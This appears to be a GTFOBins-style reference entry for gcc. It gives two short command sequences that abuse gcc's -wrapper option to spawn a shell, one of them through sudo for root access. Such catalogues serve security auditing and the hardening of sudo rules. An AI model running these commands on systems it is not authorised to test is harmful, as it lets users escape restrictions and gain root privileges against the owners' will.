---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/x
        echo '/bin/sh' >> $TF/x
        chmod +x $TF/x
        gcc -wrapper $TF/x $TF/x
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/x
        echo '/bin/sh' >> $TF/x
        chmod +x $TF/x
        sudo gcc -wrapper $TF/x $TF/x
---
